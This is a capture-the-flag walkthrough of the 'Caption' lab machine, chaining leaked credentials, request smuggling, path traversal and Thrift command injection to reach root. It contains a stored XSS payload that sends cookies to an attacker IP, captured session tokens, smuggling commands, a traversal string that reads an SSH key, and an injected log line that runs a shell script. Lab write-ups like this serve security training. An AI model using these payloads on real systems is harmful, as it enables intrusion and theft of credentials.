Caption is running a caption portal on port `80` and a gitbucket instance on port `8080`. The gitbucket site allows us to see the source behind the caption portal. The gitbucket fortunately contains credentials for margo which we can use to login. We find several pages on this site and find a stored XSS vulnerability. Through this we are able to steal cookies. Even with these cookies we are unable to access the downloads directory due to `haproxy` so we must smuggle our request by upgrading to http 2 using `h2smuggle`. We can then access the downloads directory and find an arbitrary file read used to steal margo's ssh key. After which we find the logservice and create a client that we can use to execute arbitrary commands as root.

# Foothold
### Caption Portal Login
On the webpage running on port `80` we find a custom login page:
![Pasted image 20250121165617.png](/assets/img/2025-02-08-Caption/Pasted image 20250121165617.png)
## GitBucket
On the webpage running on port `8080` we find a gitbucket site:
![Pasted image 20250121165713.png](/assets/img/2025-02-08-Caption/Pasted image 20250121165713.png)
looking at the [GitHub](https://github.com/gitbucket/gitbucket) page of `GitBucket` we find the default credentials: 
`root`
`root` 
which don't seem to log us in.
We see two repositories, the `caption-portal` one looks interesting as it's probably the webserver running on port `80`
## Caption Portal
Looking at the files found nothing interesting, checked the commit history and found: `Update Access Control` which nets us the following credentials:
`margo`
`vFr&cS2#0!`
which we can use to login into the portal!:
![Pasted image 20250121170555.png](/assets/img/2025-02-08-Caption/Pasted image 20250121170555.png)
Looking around we find nothing, trying to reuse the credentials for `GitBucket` also doesn't work
Intercepting the request to `/firewalls` and attemting `Host Header attacks` reveals that `X-Forwarded-Host` header is vulnerable to XSS:
```http

Burp repeater is inconsistent, using MatchAndReplace to automatically add header works
creating the following payload for stored XSS to steal cookies:
```
X-Forwarded-Host: 127.0.0.1"><script>fetch('http://10.10.14.23/test.php?c='+document.cookie)</script>
```
We get the following callback on our listening server:
```
10.10.11.33 - - [21/Jan/2025 18:01:43] "GET /test.php?c=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM3NTA0MDg0fQ.3KYn1rCsnRfsO9t8dQAI2FpEyqcbdlJLcNeGiCXoJ64 HTTP/1.1" 404 -
```
Running `feroxbuster` we find the following directories that are both `403 Forbidden`:
```
403      GET        4l        8w       94c http://caption.htb/logs
403      GET        4l        8w       94c http://caption.htb/download
```
- Using the stolen cookies I am still getting `403 Forbidden` on those pages:
- ![Pasted image 20250122122659.png](/assets/img/2025-02-08-Caption/Pasted image 20250122122659.png)
- Knowing that `haproxy` is running on the background I attempt to bypass it using 
[H2Csmuggler](https://github.com/BishopFox/h2csmuggler)
```console
$ python3 h2csmuggler.py -x "http://caption.htb" -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM3NTE0MTg2fQ.LQFk69bSW_dgmNpF6kCo9O0VDV0yQwEPlBHYY3xRBgs; JSESSIONID=node0q95nb4nf8uib156s6htpkkank0.node0" "http://127.0.0.1:6081/download?url=http://127.0.0.1:3923/"
```
checking the home page of the download url copy party server found this:
```
<script src="/.cpr/util.js?_=kEZE"></script>
<script src="/.cpr/baguettebox.js?_=kEZE"></script>
<script src="/.cpr/browser.js?_=kEZE"></script>
<script src="/.cpr/up2k.js?_=kEZE"></script>
```
Utilizing the `.cpr` directory attempted to read `/home/margo/.ssh/id_ecdsa` only to find that it's not found, checking the output we find that our input is injected into a form action:
```
<form method="post" enctype="multipart/form-data" action="/.cpr//home/margo/.ssh/id_ecdsa">
```
Double encoding and attemting to grab ssh keys: `%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa`:

Got `margo`!
# Margo (user)
Looking back at `gitbucket` we see that the logservice is running on port `9090`
```go
func main() {
    handler := &LogServiceHandler{}
    processor := log_service.NewLogServiceProcessor(handler)
    transport, err := thrift.NewTServerSocket(":9090")
    if err != nil {
        log.Fatalf("Error creating transport: %v", err)
    }
 
    server := thrift.NewTSimpleServer4(processor, transport, thrift.NewTTransportFactory(), thrift.NewTBinaryProtocolFactoryDefault())
    log.Println("Starting the server...")
    if err := server.Serve(); err != nil {
        log.Fatalf("Error occurred while serving: %v", err)
    }
}
```
which is consistent with the open ports:
```console
$ ss -tulnp
tcp     LISTEN   0        4096           127.0.0.1:9090          0.0.0.0:*                                           
```
Looking at the service it uses the following library for log transport:
[Apache/Thrift github](https://github.com/apache/thrift)
Here is the library's documentation: [Thrift](https://thrift.apache.org/)
Looking around for vulnerabilities in thrift I found out this:
[ Apache Thrift Go Library Command Injection ](https://github.com/advisories/GHSA-r4m4-pmvw-m6j5)
So I take a look at the thrift file in the github repository:
```go
namespace go log_service

service LogService {
    string ReadLogFile(1: string filePath)
}
```
Copy it to my box and use it to generate the files needed for a client:
```console
$ thrift -r --gen py log_service.thrift
```
Using  [ChatGPT](https://chatgpt.com/) to generate the following client `poc` in python:
```python
import sys
import time
from thrift import Thrift
from thrift.protocol import TBinaryProtocol
from thrift.transport import TSocket, TTransport
from log_Service import LogService

def main():
    # Connect to the Thrift server running on localhost:9090
    transport = TSocket.TSocket('127.0.0.1', 9090)
    transport = TTransport.TBufferedTransport(transport)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client for the LogService
    client = LogService.Client(protocol)

    try:
        # Open the transport connection
        transport.open()

        # Specify the log file path you want to read from the server
        file_path = "/home/margo/w1ld/log.log"

        # Call the ReadLogFile method on the server
        print(f"Calling ReadLogFile with file: {file_path}")
        response = client.ReadLogFile(file_path)

        # Print the response received from the server
        print("Server Response:", response)

        # Optionally, you can check the output file created by the server
        output_file = "output.log"
        try:
            with open(output_file, 'r') as file:
                print("\nContents of output.log:")
                print(file.read())
        except FileNotFoundError:
            print(f"Output file '{output_file}' does not exist.")

    except Thrift.TException as tx:
        print(f"Error: {tx.message}")

    finally:
        # Close the transport connection
        transport.close()

if __name__ == "__main__":
    main()
```
which reads the logfile `/home/margo/w1ld/log.log` which we must create:
```
127.0.0.1 "user-agent":"'; /bin/bash /home/margo/w1ld/w1ld.sh#"
```
which calls `w1ld.sh`
```
cat /root/root.txt >> /home/margo/w1ld/root.txt
```
before running the script we must forward port `9090` to our home machine:
```console
$ ssh margo@caption.htb -i id_ecdsa -L 9090:127.0.0.1:9090
```
Run the script and read the root file:
```console
kali@kali:~/htb/caption/gen-py
$ python3 poc.py
[margo:~/w1ld]
$ ls
log.log  root.txt  w1ld.sh
```
